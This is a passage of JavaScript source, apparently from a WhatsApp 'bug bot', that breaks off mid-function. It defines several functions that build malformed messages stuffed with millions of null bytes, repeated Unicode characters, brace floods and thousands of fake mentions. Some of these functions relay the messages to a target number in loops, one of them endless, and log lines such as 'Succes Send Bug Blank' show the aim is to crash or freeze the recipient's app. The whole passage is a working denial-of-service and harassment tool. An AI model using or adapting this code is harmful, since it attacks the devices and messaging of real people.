          display_text: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(1000),
          flow_message_version: "4",
        }),
      },
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(1000),
          flow_message_version: "4",
        }),
      },
    );
  }
 
  let msg = {
    ephemeralMessage: {
      message: {
        extendedTextMessage: {
          title: {
            text: usertitle,
          },
          body: {
            text: "PRIVATE JANGAN DI SHARE".repeat(500),
          },
          footer: {
            text: "",
          },
          nativeFlowMessage: {
            buttons: buttons,
              messageParamsJson: JSON.stringify({ data: "({".repeat(10000) }),
          },
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 4,
              expiryTimestamp: Date.now() + 18144000000
            },
          },
          carouselMessage: {
            messageVersion: 3,
              cards: [
                {
                  header: {
                    documentMessage: {
                      url: "",
                    },
                  },
                },
              ],
            },
          },
        },
      },
    };
    
    await sock.relayMessage(target, msg, {
      messageId: null,
      delete: { jid: target },
    });
    
    cosnole.log("Succes Send Bug Blank");
  }
  
  
async function ctaPayment(sock, target, cta) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});
  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Mabar Ml bang", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});
  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg2.message }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
  let msg3 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "ASSALAMUALAIKUM Izin Promosi Di WhatsApp Ya",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid: target });

  await sock.relayMessage("status@broadcast", msg3.message, {
    messageId: msg3.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

}

async function CallDurable(target) {
  try {
    const callPayload = {
      scheduledCallCreationMessage: {
        scheduledTimestampMs: 999999,
        callType: 2,
        title: "\n".repeat(900),
      },
    contextInfo: {
     remoteJid: target,
     participant: { jid:target },
     stanzaId: 9999,
     isForwarded: true,
     forwardingScore: 9999,
    },
  };

    await sock.relayMessage(
      target,
      callPayload,
      { messageId: callPayload.key.id }
    );

    return {
      status: true,
      message: "sent",
      payload: callPayload
    };

  } catch (err) {
    console.error("Error sending Cvcall:", err);
    return { status: false, error: err };
  }
}

async function OtaxAyunBelovedX(sock, target, mention) {
  await antiSpamDelay(); 
  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¿Otax Here¿ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`${target} SUCCES DELAY HARD`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σvalium ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }
  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, interMsg, msgxay]
 
  
    let content = {
        extendedTextMessage: {
          text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000),
          matchedText: "ꦽ".repeat(20000),
          description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
          title: "ꦽ".repeat(20000),
          previewType: "NONE",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1995 },
                () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "otax@newsletter",
                newsletterName:
                  "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                caption:
                  "⸙ᵒᵗᵃˣнοω αяє γου?¿" +
                  "ꦾ".repeat(60000) +
                  "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:
                "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      };
      
    const xnxxmsg = generateWAMessageFromContent(target, content, {});

  
  let msg = null;
  for (let i = 0; i < 100; i++) {
  await sock.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
  
    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
   
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  }
  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function galaxyMessage(sock, target, mention, cta) {
  let ConnectMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Hallo"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
                  buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                }
              ]
            }
          }
        }
      }
    }),
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Order Now",
          orderTitle: "Click Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 3000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      },
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    ConnectMsg.message.viewOnceMessage.message,
    {
      messageId: ConnectMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ConnectMsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true },
          },
        ],
      }
    );
  }
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });


  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg2.message
    }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
  console.log(chalk.red(`Galaxy Message ${target}`));
}


async function ctarlResponse(target, cta = true) {
  for (let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          expiration: 0
        },
        body: {
          text: "Xata",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
  }
  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg2.message
    }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
}




async function gsGlx(target, cta = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`), 
          isForwarded: true, 
          forwardingScore: 7205,
          expiration: 0
        }, 
        body: {
          text: "Xata",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, cta ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}

async function privatedelay() {
  const speed = 1;
  const delay = 3500;
  const increase = 500;
  const max = 25500;

  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = delay + (batchIndex * increase);
    if (currentDelay > max) currentDelay = max;
    await new Promise(res => setTimeout(res, currentDelay));

    if ((i + 1) % 60 === 0) {

      await new Promise(res => setTimeout(res, 2 * 60 * 1000));
    }
  }
}

//

async function XmagicMachine(target) {
  await privatedelay();
  console.log(chalk.red(`OVALIUM SEND BUG DELAY. SPAM TO ${target}`));

  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "— OVALIUM GHOST˙",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{
  "values": {
    "in_pin_code": "777777",
    "building_name": "4u",
    "landmark_area": "gotham",
    "address": "Medan",
    "tower_number": "0",
    "city": "Medan",
    "name": "Azizie Adnan",
    "phone_number": "62999888777",
    "house_number": "0",
    "floor_number": "19",
    "state": "${"\u0000".repeat(900000)}"
  }
}`,
          version: 3
        }
      }
    },
    { userJid: target }
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target, "0@s.whatsapp.net"],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function CallPayment(target) {
  const cards = [];
  for (let i = 0; i < 20; i++) {
    cards.push({
      header: {
        title: " 🌹",
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4",
          mimetype: "image/jpeg",
          caption: " 🌹" + "ꦽ".repeat(5000) + "ꦾ".repeat(5000),
          fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
          fileLength: "71746",
          height: 916,
          width: 720,
          mediaKey: "n5z/W8ANmTT0KmZKPyk13uTpm3eRB4czy0p/orz6LOw=",
          fileEncSha256: "CxcswDicTjs/UHDH1V5DWZh25jk1l0zMLrcTEJyuYMM=",
          directPath: "/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4",
          mediaKeyTimestamp: 1762085432,
          jpegThumbnail: null
        },
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "{[".repeat(5000),
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "PROMOTION",
              flow_cta: "X",
              flow_message_version: "3"
            })
          },
          {
            name: "mpm",
            buttonParamsJson: JSON.stringify({ status: true })
          }
        ]
      }
    });
  }

  const CallMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            body: {
              text:
                " 🌹" +
                "ꦽ".repeat(3000) +
                "ꦾ".repeat(3000)
            }
          },
          carouselMessage: {
            cards: cards
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 999
          }
        }
      }
    },
    {
     timestamp: new Date(),
  userJid: target,
  ephemeralExpiration: 0,
  mediaUploadTimeoutMs: 20000
    }
  );

  await sock.relayMessage(target, CallMsg.message, {
    messageId: CallMsg.key.id
  });
}

async function ResponseMention(sock,target, mention) {
  while (true) {
    const msg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, y) => `1313555000${y + 1}@s.whatsapp.net`
            )
          },
          body: {
            text: "—˙",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson:
              `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"medan\",\"name\":\"xxx\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target, "13135550002@s.whatsapp.net"],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );
    let msg2 = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, y) => `1313555000${y + 1}@s.whatsapp.net`
            )
          },
          body: {
            text: "WhatsApp Order",
            format: "Bold"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\".menu\",\"tower_number\":\"Y7d\",\"city\":\"OrderNow\",\"name\":\"Send here\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target, "13135550002@s.whatsapp.net"],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target }
                }
              ]
            }
          ]
        }
      ]
    });
    let ConnectMsg = await generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                hasMediaAttachment: false
              },
              body: {
                text: "Order Now Bro"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: [
                  { name: "single_select", buttonParamsJson: "\u0000" },
                  { name: "payment_info", buttonParamsJson: "\u0000" },
                  {
                    name: "catalog_message",
                    buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                  }
                ]
              }
            }
          }
        }
      }),
      {
        message: {
          orderMessage: {
            orderId: "92828",
            thumbnail: null,
            itemCount: 9999999999999,
            status: "INQUIRY",
            surface: "CATALOG",
            message: "Order Now",
            orderTitle: "Click Here",
            sellerJid: target,
            token: "8282882828==",
            totalAmount1000: "828828292727372728829",
            totalCurrencyCode: "IDR",
            messageVersion: 1,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          },
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        },
        ephemeralExpiration: 0,
        forwardingScore: 9999,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0")
      }
    );

    await sock.relayMessage(
      "status@broadcast",
      ConnectMsg.message.viewOnceMessage.message,
      {
        messageId: ConnectMsg.key?.id || "",
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    if (mention) {
      await sock.relayMessage(
        target,
        {
          groupStatusMentionMessageV2: {
            message: {
              protocolMessage: {
                key: ConnectMsg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: true }
            }
          ]
        }
      );
    }
    console.log(chalk.red(`Meta Send Bug ${target}`));
  } 
}


async function NullIpayment(sock, target, mention = false) {
  let msg = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "WhatsApp Order",
          format: "Bold"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\".menu\",\"tower_number\":\"Y7d\",\"city\":\"OrderNow\",\"name\":\"Send here\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    },
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
  let ConnectMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Order Now Bro"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
